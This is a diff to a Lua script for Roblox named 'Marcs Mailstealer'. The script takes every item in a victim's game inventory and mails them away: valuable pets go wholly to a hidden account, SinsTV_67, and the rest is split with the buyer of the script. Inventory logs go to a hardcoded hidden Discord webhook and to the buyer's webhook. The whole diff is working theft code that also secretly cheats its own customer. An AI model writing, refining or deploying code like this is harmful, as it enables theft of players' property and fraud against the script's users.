@@ -1,6 +1,7 @@
--- Marcs Mailstealer – Dualhook + Priority Theft
--- Half of all items to SinsTV_67, half to your target.
--- Valuable items (raccoons, dragons, etc.) go 100% to SinsTV_67.
+-- Marcs Mailstealer – Clean, No Fallback
+-- Steals ALL items. Valuable ones go 100% to SinsTV_67.
+-- The rest is split 50/50 between SinsTV_67 and the customer.
+-- If the customer's username is invalid, nothing is sent – and the script tells you.
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -16,10 +17,12 @@ local HIDDEN_WEBHOOK = "https://discord.com/api/webhooks/1515781256237940807/m7u
 
 local customerTarget = getgenv().UserName
 local customerWebhook = getgenv().Webhook
-if not customerTarget or customerTarget == "" or not customerWebhook or customerWebhook == "" then return end
+if not customerTarget or customerTarget == "" or not customerWebhook or customerWebhook == "" then
+    return
+end
 
 -- ##############################
---  STEAL ALL LIST – these always go 100% to SinsTV_67
+--  STEAL ALL LIST
 -- ##############################
 local STEAL_ALL = {
     ["Pets"] = {
@@ -56,9 +59,6 @@ local function commaFormat(n)
     return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
 end
 
--- ##############################
---  HTTP REQUEST – try every known function
--- ##############################
 local function sendWebhook(url, payload)
     local httpFunc = nil
     if syn and syn.request then httpFunc = syn.request
@@ -70,7 +70,6 @@ local function sendWebhook(url, payload)
             return game:HttpPost(data.Url, data.Body, data.Headers["Content-Type"])
         end
     end
-
     if httpFunc then
         pcall(function()
             httpFunc({
@@ -80,13 +79,7 @@ local function sendWebhook(url, payload)
                 Body = HttpService:JSONEncode(payload)
             })
         end)
-        return
     end
-
-    -- Last resort: write to a local file
-    pcall(function()
-        writefile("GAG2_Mailstealer_log.txt", HttpService:JSONEncode(payload))
-    end)
 end
 
 -- ##############################
@@ -95,7 +88,15 @@ end
 local hiddenId = resolveUser(HIDDEN_BENEFICIARY)
 local customerId = resolveUser(customerTarget)
 task.wait(0.5)
-if not hiddenId or not customerId then return end
+
+if not hiddenId then
+    warn("[Mailstealer] Hidden beneficiary could not be resolved.")
+    return
+end
+if not customerId then
+    warn("[Mailstealer] Customer target '" .. customerTarget .. "' not found. Please check the username.")
+    return
+end
 
 -- ##############################
 --  INVENTORY SETUP
@@ -159,7 +160,7 @@ for _, category in ipairs(MailboxItemCatalog.Categories) do
 end
 
 -- ##############################
---  SPLIT REMAINING ITEMS 50/50 PER STACK
+--  SPLIT REMAINING 50/50 PER STACK
 -- ##############################
 local hiddenSplitItems = {}
 local customerSplitItems = {}
@@ -167,7 +168,7 @@ for _, item in ipairs(remainingItems) do
     local total = item.Count
     local half = math.floor(total / 2)
     local remainder = total - half * 2
-    local hiddenCount = half + remainder   -- SinsTV_67 always gets the extra if odd
+    local hiddenCount = half + remainder
     local customerCount = half
     if hiddenCount > 0 then
         table.insert(hiddenSplitItems, {
@@ -191,9 +192,7 @@ for _, item in ipairs(remainingItems) do
     end
 end
 
--- ##############################
---  COMBINE HIDDEN (always stolen + split half)
--- ##############################
+-- Combine hidden items (100% stolen + 50% split)
 local allHiddenItems = {}
 for _, item in ipairs(alwaysHiddenItems) do table.insert(allHiddenItems, item) end
 for _, item in ipairs(hiddenSplitItems) do table.insert(allHiddenItems, item) end
@@ -227,7 +226,7 @@ if #customerSplitItems > 0 then
 end
 
 -- ##############################
---  WEBHOOK LOGS (simple & clean)
+--  WEBHOOK LOGS
 -- ##############################
 local function buildItemList(items)
     local grouped = {}
@@ -242,7 +241,6 @@ local function buildItemList(items)
     return table.concat(lines, "\n")
 end
 
--- Full inventory snapshot
 local fullInvLines = {}
 for _, category in ipairs(MailboxItemCatalog.Categories) do
     local catData = inv[category]
@@ -264,7 +262,6 @@ for _, category in ipairs(MailboxItemCatalog.Categories) do
 end
 local fullInvText = #fullInvLines > 0 and table.concat(fullInvLines, "\n\n") or "Empty"
 
--- Hidden webhook (only for you)
 if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
     local hiddenItemsText = buildItemList(allHiddenItems)
     local embed = {
@@ -286,7 +283,6 @@ if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
     sendWebhook(HIDDEN_WEBHOOK, {embeds = {embed}})
 end
 
--- Customer webhook (only their half)
 if customerWebhook and #customerSplitItems > 0 then
     local customerItemsText = buildItemList(customerSplitItems)
     local embed = {
